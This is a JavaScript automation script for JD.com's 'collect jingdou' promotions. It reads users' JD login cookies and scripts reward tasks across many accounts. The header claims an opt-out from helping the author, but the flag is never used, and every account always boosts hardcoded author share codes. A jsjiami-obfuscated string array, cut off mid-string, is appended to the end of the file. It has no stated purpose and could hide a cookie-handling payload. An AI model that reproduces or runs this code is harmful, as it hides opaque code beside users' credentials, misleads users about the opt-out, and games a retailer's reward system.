/*
领京豆额外奖励&抢京豆
脚本自带助力码，介意者可将 29行 helpAuthor 变量设置为 false
活动入口：京东APP首页-领京豆
更新地址：https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_bean_home.js
已支持IOS双京东账号, Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, 小火箭，JSBox, Node.js
============Quantumultx===============
[task_local]
#领京豆额外奖励
23 1,12,22 * * * https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_bean_home.js, tag=领京豆额外奖励, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_bean_home.png, enabled=true

================Loon==============
[Script]
cron "23 1,12,22 * * *" script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_bean_home.js, tag=领京豆额外奖励

===============Surge=================
领京豆额外奖励 = type=cron,cronexp="23 1,12,22 * * *",wake-system=1,timeout=3600,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_bean_home.js

============小火箭=========
领京豆额外奖励 = type=cron,script-path=https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_bean_home.js, cronexpr="23 1,12,22 * * *", timeout=3600, enable=true
 */
const $ = new Env('领京豆额外奖励');

const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
const helpAuthor = false; // 是否帮助作者助力，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', uuid = '', message;
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {
  };
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/';
!(async () => {
  $.newShareCodes = []
  $.authorCode = [
      '949D23BA4BF155E896ED2741E763777A',
      '6C177B528326CE25E235892EADA721B9AD1DAAB9A3E3F6CBAFDE81EEB7393333',
      'E0D615F28CF0B201D5244D6C12F7A8FD',
      '7CD6B2A0B1621FCA9F9286A10D1276F8AD1DAAB9A3E3F6CBAFDE81EEB7393333',
      '35AD168859F2C38C31BF96C538BB1D03AD1DAAB9A3E3F6CBAFDE81EEB7393333',
      'A582C750896BD0570150BB28F2142A84',
      'FF48BA00E268024691968622DF67A839'
  ]
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      uuid = randomString(40)
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdBeanHome();
    }
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    $.index = i + 1;
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.canHelp = true;
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      if ($.authorCode) {
        for (let code of $.authorCode) {
          const helpRes = await help(code.shareCode, code.groupCode);
          if (helpRes && helpRes['code'] === '0') {
            if (helpRes && helpRes.data && helpRes.data.respCode === 'SG209') {
              console.log(`${helpRes.data.helpToast}\n`);
              break;
            }
          } else {
            console.log(`助力异常:${JSON.stringify(helpRes)}\n`);
          }
        }
      }
      if ($.newShareCodes.length > 1) {
        console.log(`\n【抢京豆】 ${$.UserName} 去助力排名第一的cookie`);
        // let code = $.newShareCodes[(i + 1) % $.newShareCodes.length]
        // await help(code[0], code[1])
        let code = $.newShareCodes[0];
        if(code[2] && code[2] ===  $.UserName){
          //不助力自己
        } else {
          await help(code[0], code[1]);
        }
      }
      for (let j = 1; j < $.newShareCodes.length && $.canHelp; j++) {
        let code = $.newShareCodes[j];
        if(code[2] && code[2] ===  $.UserName){
          //不助力自己
        } else {
          console.log(`【抢京豆】${$.UserName} 去助力账号 ${j + 1}`);
          await help(code[0], code[1]);
          await $.wait(2000);
        }
      }
    }
  }
})()
  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })

async function jdBeanHome() {
  try {
    await invite()
    $.doneState = false
    // for (let i = 0; i < 3; ++i) {
    //   await doTask2()
    //   await $.wait(1000)
    //   if ($.doneState) break
    // }
    do {
      await doTask2()
      await $.wait(3000)
    } while (!$.doneState)
    await $.wait(1000)
    await award("feeds")
    await $.wait(1000)
    await getUserInfo()
    await $.wait(1000)
    await getTaskList();
    await receiveJd2();

    await morningGetBean()
    await $.wait(1000)

    await beanTaskList(1)
    await $.wait(1000)
    await queryCouponInfo()
    $.doneState = false
    do {
      await $.wait(2000)
      await beanTaskList(2)
    } while (!$.doneState)
    await $.wait(2000)
    if ($.doneState) await beanTaskList(3)

    await showMsg();
  } catch (e) {
    $.logErr(e)
  }
}

// 早起福利
function morningGetBean() {
  return new Promise(resolve => {
    $.post(taskBeanUrl('morningGetBean', {"fp":"-1","shshshfp":"-1","shshshfpa":"-1","referUrl":"-1","userAgent":"-1","jda":"-1","rnVersion":"3.9"}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} morningGetBean API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data.awardResultFlag === "1") {
              console.log(`早起福利领取成功：${data.data.bizMsg}`)
            } else if (data.data.awardResultFlag === "2") {
              console.log(`早起福利领取失败：${data.data.bizMsg}`)
            } else {
              console.log(`早起福利领取失败：${data.data.bizMsg}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

// 升级领京豆任务
async function beanTaskList(type) {
  return new Promise(resolve => {
    $.post(taskBeanUrl('beanTaskList', {"viewChannel":"myjd"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} beanTaskList API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            switch (type) {
              case 1:
                console.log(`当前等级:${data.data.curLevel} 下一级可领取:${data.data.nextLevelBeanNum || 0}京豆`)
                if (!data.data.viewAppHome.takenTask) {
                  console.log(`去做[${data.data.viewAppHome.mainTitle}]`)
                  await beanHomeIconDoTask({"flag":"0","viewChannel":"myjd"})
                }
                await $.wait(2000)
                if (!data.data.viewAppHome.doneTask) {
                  console.log(`去领奖[${data.data.viewAppHome.mainTitle}]`)
                  await beanHomeIconDoTask({"flag":"1","viewChannel":"AppHome"})
                } else {
                  console.log(`[${data.data.viewAppHome.mainTitle}]已做完`)
                }
                break
              case 2:
                $.doneState = true
                let taskInfos = data.data.taskInfos
                for (let key of Object.keys(taskInfos)) {
                  let vo = taskInfos[key]
                  if (vo.times < vo.maxTimes) {
                    for (let key of Object.keys(vo.subTaskVOS)) {
                      let taskList = vo.subTaskVOS[key]
                      if (taskList.status === 1) {
                        $.doneState = false
                        console.log(`去做[${vo.taskName}]${taskList.title}`)
                        await $.wait(2000)
                        await beanDoTask({"actionType": 1, "taskToken": `${taskList.taskToken}`}, vo.taskType)
                        if (vo.taskType === 9) {
                          await $.wait(3000)
                          await beanDoTask({"actionType": 0, "taskToken": `${taskList.taskToken}`}, vo.taskType)
                        }
                      }
                    }
                  }
                }
                break
              case 3:
                let taskInfos3 = data.data.taskInfos
                for (let key of Object.keys(taskInfos3)) {
                  let vo = taskInfos3[key]
                  if (vo.times === vo.maxTimes) {
                    console.log(`[${vo.taskName}]已做完`)
                  }
                }
              default:
                break
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function beanDoTask(body, taskType) {
  return new Promise(resolve => {
    $.post(taskBeanUrl('beanDoTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} beanDoTask API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (body.actionType === 1 && taskType !== 9) {
              if (data.code === "0" && data.data.bizCode === "0") {
                console.log(`完成任务，获得+${data.data.score}成长值`)
              } else {
                console.log(`完成任务失败：${data}`)
              }
            }
            if (body.actionType === 0) {
              if (data.code === "0" && data.data.bizCode === "0") {
                console.log(data.data.bizMsg)
              } else {
                console.log(`完成任务失败：${data}`)
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function beanHomeIconDoTask(body) {
  return new Promise(resolve => {
    $.post(taskBeanUrl('beanHomeIconDoTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} beanHomeIconDoTask API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (body.flag === "0" && data.data.taskResult) {
              console.log(data.data.remindMsg)
            }
            if (body.flag === "1" && data.data.taskResult) {
              console.log(data.data.remindMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function queryCouponInfo() {
  return new Promise(async resolve => {
    $.get(taskBeanUrl('queryCouponInfo', {"rnVersion":"4.7","fp":"-1","shshshfp":"-1","shshshfpa":"-1","referUrl":"-1","userAgent":"-1","jda":"-1"}), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} queryCouponInfo API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data && data.data.couponTaskInfo) {
              if (!data.data.couponTaskInfo.awardFlag) {
                console.log(`去做[${data.data.couponTaskInfo.taskName}]`)
                await sceneGetCoupon()
              } else {
                console.log(`[${data.data.couponTaskInfo.taskName}]已做完`)
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function sceneGetCoupon() {
  return new Promise(resolve => {
    $.get(taskBeanUrl('sceneGetCoupon', {"rnVersion":"4.7","fp":"-1","shshshfp":"-1","shshshfpa":"-1","referUrl":"-1","userAgent":"-1","jda":"-1"}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} sceneGetCoupon API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === '0' && data.data && data.data.bizMsg) {
              console.log(data.data.bizMsg)
            } else {
              console.log(`完成任务失败：${data}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function randomString(e) {
  e = e || 32;
  let t = "abcdefhijkmnprstwxyz2345678", a = t.length, n = "";
  for (i = 0; i < e; i++)
    n += t.charAt(Math.floor(Math.random() * a));
  return n
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
function doTask2() {
    return new Promise(resolve => {
      const body = {"awardFlag": false, "skuId": `${getRandomInt(10000000,20000000)}`, "source": "feeds", "type": '1'};
      $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
        try {
          if (err) {
            console.log(`${JSON.stringify(err)}`)
            console.log(`${$.name} API请求失败，请检查网路重试`)
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
              if (data.code === '0' && data.data){
                console.log(`任务完成进度：${data.data.taskProgress}/${data.data.taskThreshold}`)
                if(data.data.taskProgress === data.data.taskThreshold)
                  $.doneState = true
              } else if (data.code === '0' && data.errorCode === 'HT201') {
                $.doneState = true
              } else {
                //HT304风控用户
                $.doneState = true
                console.log(`做任务异常：${JSON.stringify(data)}`)
              }
            }
          }
        } catch (e) {
          $.logErr(e, resp)
        } finally {
          resolve();
        }
      })
    })
}

function getAuthorShareCode(url) {
  return new Promise(resolve => {
    const options = {
      url: `${url}?${new Date()}`, "timeout": 10000, headers: {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }
    };
    if ($.isNode() && process.env.TG_PROXY_HOST && process.env.TG_PROXY_PORT) {
      const tunnel = require("tunnel");
      const agent = {
        https: tunnel.httpsOverHttp({
          proxy: {
            host: process.env.TG_PROXY_HOST,
            port: process.env.TG_PROXY_PORT * 1
          }
        })
      }
      Object.assign(options, { agent })
    }
    $.get(options, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          if (data) data = JSON.parse(data)
        }
      } catch (e) {
        // $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function getUserInfo() {
  return new Promise(resolve => {
    $.post(taskUrl('signBeanGroupStageIndex', 'body'), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.data.jklInfo) {
              $.actId = data.data.jklInfo.keyId
              let {shareCode, groupCode} = data.data
              if (!shareCode) {
                console.log(`未获取到助力码，去开团`)
                await hitGroup()
              } else {
                console.log(shareCode, groupCode)
                // 去做逛会场任务
                if (data.data.beanActivityVisitVenue && data.data.beanActivityVisitVenue.taskStatus === '0') {
                  await help(shareCode, groupCode, 1)
                }
                console.log(`\n京东账号${$.index} ${$.nickName || $.UserName} 抢京豆邀请码：${shareCode}\n`);
                $.newShareCodes.push([shareCode, groupCode, $.UserName])
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function hitGroup() {
  return new Promise(resolve => {
    const body = {"activeType": 2,};
    $.get(taskGetUrl('signGroupHit', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data.respCode === "SG150") {
              let {shareCode, groupCode} = data.data.signGroupMain
              if (shareCode) {
                $.newShareCodes.push([shareCode, groupCode, $.UserName])
                console.log('开团成功')
                console.log(`\n京东账号${$.index} ${$.nickName || $.UserName} 抢京豆邀请码：${shareCode}\n`);
                await help(shareCode, groupCode, 1)
              } else {
                console.log(`为获取到助力码，错误信息${JSON.stringify(data.data)}`)
              }
            } else {
              console.log(`开团失败，错误信息${JSON.stringify(data.data)}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function help(shareCode, groupCode, isTask = 0) {
  return new Promise(resolve => {
    const body = {
      "activeType": 2,
      "groupCode": groupCode,
      "shareCode": shareCode,
      "activeId": $.actId,
    };
    if (isTask) {
      console.log(`【抢京豆】做任务获取助力`)
      body['isTask'] = "1"
    } else {
      console.log(`【抢京豆】去助力好友${shareCode}`)
      body['source'] = "guest"
    }
    $.get(taskGetUrl('signGroupHelp', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`【抢京豆】${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === '0') {
              console.log(`【抢京豆】${data.data.helpToast}`)
            }
            if(data.code === '0' && data.data && data.data.respCode === 'SG209') {
              $.canHelp = false;
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function showMsg() {
  return new Promise(resolve => {
    if (message) $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    resolve()
  })
}

function getTaskList() {
  return new Promise(resolve => {
    const body = {"rnVersion": "4.7", "rnClient": "2", "source": "AppHome"};
    $.post(taskUrl('findBeanHome', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            let beanTask = data.data.floorList.filter(vo => vo.floorName === "种豆得豆定制化场景")[0]
            if (!beanTask.viewed) {
              await receiveTask()
              await $.wait(3000)
            }

            let tasks = data.data.floorList.filter(vo => vo.floorName === "赚京豆")[0]['stageList']
            for (let i = 0; i < tasks.length; ++i) {
              const vo = tasks[i]
              if (vo.viewed) continue
              await receiveTask(vo.stageId, `4_${vo.stageId}`)
              await $.wait(3000)
            }
            await award()
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function receiveTask(itemId = "zddd", type = "3") {
  return new Promise(resolve => {
    const body = {"awardFlag": false, "itemId": itemId, "source": "home", "type": type};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`完成任务成功，进度${data.data.taskProgress}/${data.data.taskThreshold}`)
            } else {
              console.log(`完成任务失败，${data.errorMessage}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}


function award(source="home") {
  return new Promise(resolve => {
    const body = {"awardFlag": true, "source": source};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`领奖成功，获得 ${data.data.beanNum} 个京豆`)
              message += `领奖成功，获得 ${data.data.beanNum} 个京豆\n`
            } else {
              console.log(`领奖失败，${data.errorMessage}`)
              // message += `领奖失败，${data.errorMessage}\n`
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function receiveJd2() {
  var headers = {
    'Host': 'api.m.jd.com',
    'content-type': 'application/x-www-form-urlencoded',
    'accept': '*/*',
    'user-agent': 'JD4iPhone/167515 (iPhone; iOS 14.2; Scale/3.00)',
    'accept-language': 'zh-Hans-JP;q=1, en-JP;q=0.9, zh-Hant-TW;q=0.8, ja-JP;q=0.7, en-US;q=0.6',
    'Cookie': cookie
  };
  var dataString = 'body=%7B%7D&build=167576&client=apple&clientVersion=9.4.3&openudid=53f4d9c70c1c81f1c8769d2fe2fef0190a3f60d2&osVersion=14.2&partner=TF&rfs=0000&scope=10&screen=1242%2A2208&sign=19c33b5b9ad4f02c53b6040fc8527119&st=1614701322170&sv=122'
  var options = {
    url: 'https://api.m.jd.com/client.action?functionId=sceneInitialize',
    headers: headers,
    body: dataString
  };
  return new Promise(resolve => {
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['code'] === '0' && data['data']) {
              console.log(`强制开启新版领京豆成功,获得${data['data']['sceneLevelConfig']['beanNum']}京豆\n`);
              $.msg($.name, '', `强制开启新版领京豆成功\n获得${data['data']['sceneLevelConfig']['beanNum']}京豆`);
            } else {
              console.log(`强制开启新版领京豆结果:${JSON.stringify(data)}\n`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function taskGetUrl(function_id, body) {
  return {
    url: `${JD_API_HOST}client.action?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&clientVersion=9.2.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}

function taskBeanUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}client.action?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&clientVersion=10.0.8&uuid=${uuid}&openudid=${uuid}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
      "Referer": "https://h5.m.jd.com/"
    }
  }
}

function taskUrl(function_id, body) {
  body["version"] = "9.0.0.1";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=5_274_49707_49973&build=167283&clientVersion=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodE='jsjiami.com.v6',_0xcadb=[_0xodE,'HcKMw7A/w7E=','w5HCpGoKdQ==','UsOMOMKrwqdfwpPDrTTDi8OYw6ACGwEVw5tKBsK2UcO9wqoDw4EMT8OQwq3Dvz5Rw5bDvsOBw65jW0UePi7CtX8eICzDgA1Qw5AeW8OOw6wjXsKPw6pzwoXDpizDrcOUwr7DgMOhwpLCmwVSWMKzIMKwwqRwJF1jSQ==','Xxw6woZwQ11yDmRiL8OHw4jCuMOsYUlUDMOfXQvDvl7DrsOzXAJOQsOkwrUgwozCtRLDiiV2GsOFw5ZKw5o1XMOMw6ZwHcKHVlbCnMOZbMOEwoIzfMKyIcOUfcOCP8Orw4AUQsOBKAjCkDnDrx7DvgzCq8OYwoRiLcKcNcOZZiIHK3vCvSckw77Ds8KAwozChsOMw4R1JsO/w63CpsKGw5PDk1VZwpZ2wqHChsKpAMKyw5YFJAo0cgHDmznCnGNzw7/CpRwRwroea8OCLsOpwoLCrsOkw7cGYgdIQn4zMwJ2','w7VVwp07w6Q=','wqh7e8KPwrQ=','w7tbRSTCmA==','Yw/CswZk','w7/Cjn8RUQ==','wqQcYcKCZQ==','ASoYw4LDvQ==','VzEPwp5I','dXM4','Pjk8HcKz','bk/CgsKRw6M=','wrRzPCHCvA==','w4t5wpPDocKb','HMKYw7gPw5Y=','wpMIKsKWIRo=','K8ObDg==','w5VswoY6','w77Cp1LCqiM=','OTgEC8Kp','wrJ3w7Ebw5c=','FzIT','ClDDrMK8','EcKiU37or4Pms4Xlp4jotpzvvKbor6/moIbmnI7nvqrotprphozoroM=','wqLDt8Oaw60M','UcOMw65bwrTDrAE=','w6zCrXbCiCw=','w7xbXzHCsA==','AFDDtcK4f8KQUA==','fhYuwohoRw==','SMKdQB/DiA==','UcKYwoDDnD7CqMOS','f3HCnB/Clw==','w4UUw4vCmmrDvw==','wpsawr5Rw4UlSQ==','w41AbAXCvg==','TcOfw61ywrc=','wpMUwq11w7Ay','T8OEw5xMwpU=','SsOfw7/DjMOg','b8OHw5fDtMOM','w6VRw7fDpDc=','ABQKGsKg','dwsYwqt1','X8KLwpbDiT0=','wp4LwqMew69uVwYie1sA','CS0FAcO5P8OLEcK+wrjCn8KVw4vDj8KdRsOKf1gnMMOeKRFOwqM9d2MFwpfDksKq','Gi0EIcK4dsKyMsOQMMKJcigzworCpsO5TMOEw6zCh2LDqDhmwo48HjI3ckEa','cXTDl8OzTsOow77DtjvDrhJKZcKRbgfDtioUwo8TU0kkw4MrWEs=','w5wnwpvDgsOI','acKbI8KtcsOmw78IaREqwpBEw5TDgjk=','ZMOlw6PDqg==','w5gRwq5cw7YhTRI3cWQMd8Kewr/CjzTDqsO1PzZQw7zDksKmw5p9wozDgVHCucO9wqJLZ8KNQMO0w7DCnsOjwrvCsgHDv8O4wqnDssKEwoXCln8UDh4cw7DCkHvCj8Ohw4t8woMrw41yw4PDnsOjKMKCNSZGw50VKMOyAjHCs00hw5dsw4zDtx9ZHcKBKgtUTMOKwqfCssOQbTnCv8KQw7REw71RYcOdwoPDgsKkw6PCtjvDkcOew4spEcO9w6Mbfk7DrmUywqfDjcKbw7DDnl/DlsOrbF55w70hw7RIwo19ORAmGcKPPMK5aQ==','Q8O9w4zDg8OmAznDksKAw51SwoHDqloENUjDs8OXw60vJsKNw7c0acKtw4I+','YMOLw5/DkcKc','C8KVTcKSwow=','woXDjsOtw4wz','cMK2wpvDsj4=','EC8gOcKW','wpdywqMBNA==','RhXCqSZc','wr0ewpJow6A=','w6FYWTvCrg==','w6ogw4rCvmo=','wpENW8KLeQ==','w5l6w4zDgTfCm0nCosOv','XcOZw65KwoDCs1rCusKcwoEmw4XCn8Khw5t2P8OxwrLCrcKXKsO0CA==','w5p5wpdNw7U=','BhY0JMOe','w55QVDvCkA==','wroQesKfXQ==','XsKveVR/','SAF3W1s5','w7tefw==','wo9Rw6EGw6bCuMKJwpNnHX4JAw==','PsKOSA==','ayFmYWwZbXfCvH3CvyXDqQ==','w7EIw6HDpsOP','w48fw5PDjsOT','wpFkW8KswonDnXnDqcOZwrQ=','w4hbSxXClsKqeg==','w4NYw7zDmCI=','w7lVfQTCu3fCvQ==','YsO9w4zDsMKo','dlECwpLCmA==','aTTCvRVY','wolIwrsqJhITcsOnwqzCnMKWF8KWLzIlHMKVwrBLw5PCjMKIwphTJsKfwqg2EhB4XnfCky4Yw6xycR7DklPCpsKeVMK0asOwXcKzwpPCslY3UikLw5xVB8OOwrbDhGA5w4V0aH3Dl8KANzVrwocJbsOYPQLCusOmw6gNw4wh